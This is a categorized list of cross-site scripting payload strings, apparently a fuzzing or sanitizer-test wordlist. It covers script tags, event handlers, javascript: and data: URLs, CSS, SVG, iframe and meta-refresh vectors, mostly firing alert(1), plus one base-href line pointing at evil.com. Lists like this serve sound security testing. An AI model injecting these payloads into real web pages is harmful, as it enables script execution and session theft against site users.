# Script Injection Vectors
"<script>alert(1)</script>"
"<script src=\"javascript:alert(1)\"></script>"
"<script src=\"data:text/javascript,alert(1)\"></script>"
"<script>eval('alert(1)')</script>"
"<script>Function('alert(1)')()</script>"
"<script>setTimeout('alert(1)', 0)</script>"
"<script>setInterval('alert(1)', 0)</script>"
"<script>({}+[]).constructor.constructor('alert(1)')()</script>"

# Event Handler Injection
"<img src=x onerror=alert(1)>"
"<body onload=alert(1)>"
"<div onclick=alert(1)>"
"<svg onload=alert(1)>"
"<iframe onload=alert(1)>"
"<object onload=alert(1)>"
"<embed onload=alert(1)>"
"<video onloadstart=alert(1)>"
"<audio oncanplay=alert(1)>"

# JavaScript URL Schemes
"javascript:alert(1)"
"javascript:eval('alert(1)')"
"javascript:Function('alert(1)')()"
"javascript:setTimeout('alert(1)',0)"
"javascript:(function(){alert(1)})()"
"javascript:with(document)write(1)"

# Data URL Schemes
"data:text/html,<script>alert(1)</script>"
"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
"data:text/javascript,alert(1)"
"data:application/javascript,alert(1)"
"data:text/css,body{background:url(javascript:alert(1))}"

# Style Injection Vectors
"<style>@import 'javascript:alert(1)';</style>"
"<style>body{background:url('javascript:alert(1)')}</style>"
"<style>body{background:expression(alert(1))}</style>"
"<style>body{-moz-binding:url('javascript:alert(1)')}</style>"
"<link rel=stylesheet href=\"javascript:alert(1)\">"
"<style>/**/</style><script>alert(1)</script>"

# SVG-based Injection
"<svg><script>alert(1)</script></svg>"
"<svg onload=alert(1)>"
"<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>"
"<svg><use href=\"data:image/svg+xml,<svg><script>alert(1)</script></svg>\"></use></svg>"

# Object/Embed Vectors
"<object data=\"javascript:alert(1)\"></object>"
"<embed src=\"javascript:alert(1)\">"
"<object data=\"data:text/html,<script>alert(1)</script>\"></object>"
"<embed src=\"data:text/html,<script>alert(1)</script>\">"

# Import/Module Vectors
"<script type=\"module\">import('data:text/javascript,alert(1)')</script>"
"<script>import('javascript:alert(1)')</script>"
"<script>import('./data:text/javascript,alert(1)')</script>"

# Form Action Vectors
"<form action=\"javascript:alert(1)\"><input type=submit></form>"
"<form action=\"data:text/html,<script>alert(1)</script>\"></form>"

# Base URI Manipulation
"<base href=\"javascript:\">"
"<base href=\"data:text/html,\">"
"<base href=\"//evil.com/\">"

# Frame Injection
"<iframe src=\"javascript:alert(1)\"></iframe>"
"<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>"
"<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"

# Meta Refresh Redirection
"<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">"
"<meta http-equiv=refresh content=\"0;url=data:text/html,<script>alert(1)</script>\">"

# CSS Expression (IE)
"expression(alert(1))"
"expression(eval('alert(1)'))"
"expression(Function('alert(1)')())"

# Mozilla Binding (Firefox)
"-moz-binding:url('javascript:alert(1)')"
"-moz-binding:url('data:text/html,<script>alert(1)</script>')"

# WebKit/Blink Specific
"-webkit-filter:url('javascript:alert(1)')"
"filter:url('javascript:alert(1)')"

# Font-face Injection
"@font-face{font-family:x;src:url('javascript:alert(1)')}"
"@font-face{font-family:x;src:url('data:font/woff,javascript:alert(1)')}"

# Keyframes Animation
"@keyframes x{from{background:url('javascript:alert(1)')}}",
"animation:x 1s"

